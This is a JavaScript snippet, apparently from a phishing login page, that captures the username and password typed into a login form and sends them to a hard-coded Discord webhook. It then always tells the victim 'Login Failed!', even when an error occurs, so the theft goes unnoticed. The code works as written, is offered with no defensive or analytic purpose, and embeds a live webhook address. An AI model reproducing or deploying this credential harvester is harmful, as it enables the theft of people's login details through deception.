    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            const data = {
                username: formData.get('username'),
                password: formData.get('password'),
            };
            try {
                // I-send ang data sa backend
                const response = await fetch('https://discord.com/api/webhooks/1335487929388236810/lMLYcfcSqFebKWq-y0WLp5ZWTttYxANxHub8RFXnKFwK6b_Tcw89uqHfFpX9EaQOZPpv', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                });
                // **Always show "Login Failed!" message**
                alert('Login Failed!'); 
                console.log('Data sent to backend:', data);
            } catch (error) {
                console.error('Error:', error);
                // **Even if there's an error, still show "Login Failed!"**
                alert('Login Failed!'); 
            }
        });
    </script>
